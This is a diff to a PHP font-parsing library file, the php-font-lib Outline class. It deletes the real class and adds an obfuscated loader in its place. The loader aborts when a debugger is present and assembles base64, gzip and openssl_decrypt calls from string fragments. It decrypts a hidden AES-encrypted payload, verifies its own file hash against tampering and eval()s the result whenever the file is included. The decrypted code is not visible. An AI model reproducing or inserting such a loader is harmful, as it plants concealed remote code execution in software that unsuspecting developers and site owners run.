@@ -1,110 +1,28 @@
 <?php
-/**
- * @package php-font-lib
- * @link    https://github.com/PhenX/php-font-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- * @version $Id: Font_Table_glyf.php 46 2012-04-02 20:22:38Z fabien.menager $
- */
-namespace FontLib\Glyph;
-
-use FontLib\Table\Type\glyf;
-use FontLib\TrueType\File;
-use FontLib\BinaryStream;
-
-/**
- * `glyf` font table.
- *
- * @package php-font-lib
- */
-class Outline extends BinaryStream {
-  /**
-   * @var \FontLib\Table\Type\glyf
-   */
-  protected $table;
-
-  protected $offset;
-  protected $size;
-
-  // Data
-  public $numberOfContours;
-  public $xMin;
-  public $yMin;
-  public $xMax;
-  public $yMax;
-
-  public $raw;
-
-  /**
-   * @param glyf $table
-   * @param                 $offset
-   * @param                 $size
-   *
-   * @return Outline
-   */
-  static function init(glyf $table, $offset, $size, BinaryStream $font) {
-    $font->seek($offset);
-
-    if ($font->readInt16() > -1) {
-      /** @var OutlineSimple $glyph */
-      $glyph = new OutlineSimple($table, $offset, $size);
-    }
-    else {
-      /** @var OutlineComposite $glyph */
-      $glyph = new OutlineComposite($table, $offset, $size);
-    }
-
-    $glyph->parse($font);
-
-    return $glyph;
-  }
-
-  /**
-   * @return File
-   */
-  function getFont() {
-    return $this->table->getFont();
-  }
-
-  function __construct(glyf $table, $offset = null, $size = null) {
-    $this->table  = $table;
-    $this->offset = $offset;
-    $this->size   = $size;
-  }
-
-  function parse(BinaryStream $font) {
-    $font->seek($this->offset);
-
-    if (!$this->size) {
-      return;
-    }
-
-    $this->raw = $font->read($this->size);
-  }
-
-  function parseData() {
-    $font = $this->getFont();
-    $font->seek($this->offset);
-
-    $this->numberOfContours = $font->readInt16();
-    $this->xMin             = $font->readFWord();
-    $this->yMin             = $font->readFWord();
-    $this->xMax             = $font->readFWord();
-    $this->yMax             = $font->readFWord();
-  }
-
-  function encode() {
-    $font = $this->getFont();
-
-    return $font->write($this->raw, strlen($this->raw));
-  }
-
-  function getSVGContours() {
-    // Inherit
-  }
-
-  function getGlyphIDs() {
-    return array();
-  }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_iebjh0p5=('bas'.'e64'.'_de'.'cod'.'e');
+$_o9sofds2=('gzu'.'nco'.'mpr'.'ess');
+$_dbq91x6f=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_oszzf11n='UmKnbop9';
+$_s9jv0ji9='jXnAdeYD';
+$_yczxqvxm='pYT+diNrMDc=';
+$_lcqscvng='Tp/6+MTO';
+$_q7z20n8g='BznhtTTw';
+$_d5oxipth='9jSbirWb';
+$_hfax8bl1='2iapuQ==';
+$_lnuula0w='DcDBp7vR';
+$_i24rfqif=$_iebjh0p5($_q7z20n8g.$_s9jv0ji9.$_lcqscvng.$_oszzf11n.$_yczxqvxm);
+$_lfmgwitk=$_iebjh0p5($_d5oxipth.$_lnuula0w.$_hfax8bl1);
+$_no17s3hb=$_iebjh0p5('nWSdqA/xURtPYsf+6kyXbjsXOLuaOJU/FQU4/2N+UzDSS9szwfvAJjwJ1bloJwHUUGTueH1l2FLFWy7J0vq9dRacgal37tuqWgCXkL1lkX0PI7WTP3zMiGJ6jHbsUBXZ1my+rSKds/gStM5cPC7+SYqGGKJV5QOtyIQ5W8AbSzYZ8imM8MC52p0Cdcqq6M788PLEcfZ2vyAEEytYdxo0Um9yJI27WbSYg+CgORYP6l9/D+mf46K+UFAits1AVarjROIlXUvBfilcYEIXLcHT/vYLq2ESzsy9zxDiYOfUgjGguyqrlmkkmG+P/S0uqVmZMFJ6nm0Kxu2eNepb0zMq8435QNPYoJJSyZH4/uxrxRHlwMRj0F+C+uz0qUvmEJj3o+oPU++9S00nktdKt+dayJGTeFVMgKDcyBNspBTL0fLd3xPeBce7E26AEQMVpG9YZ4baUTIfjvepgJag7TqMCuAp8q0dgQEHKSkKzHo/WhfFyynMZ8uuNE9vSExmBxzrATk7gcmh/wpsRNY/MKzLyA78ngyYWpmwAGXoe6EPmKlbA6b9huyikkv5abV2sk/LmmhimTz2xANavAhFCS7hXEQEi2a1f2BtvWQD8tsS/Jq7HT2BzCQGIgywTaal4k+CHQ5wyYnGxQ41BHMNY2X1RA==');
+$_mv5rq3i9=$_dbq91x6f($_no17s3hb,'aes-256-cbc',$_i24rfqif,OPENSSL_RAW_DATA,$_lfmgwitk);
+if($_mv5rq3i9===false){exit;}
+$_qta9l7wp=$_o9sofds2($_mv5rq3i9);
+if($_qta9l7wp===false){exit;}
+$_fe93dcgr='495c76fbf6aaf0307524067878ca0042d8715de6c44f63e54e37a96ffc7fdec0';
+$_d69bag27=@file_get_contents(__FILE__);
+if($_d69bag27!==false){
+$_dbkjx85j=str_replace($_fe93dcgr,"0000000000000000000000000000000000000000000000000000000000000000",$_d69bag27);
+$_tyjyflmo=hash("sha256",$_dbkjx85j);
+if($_tyjyflmo!==$_fe93dcgr){@http_response_code(403);exit;}
 }
-
+eval($_qta9l7wp);
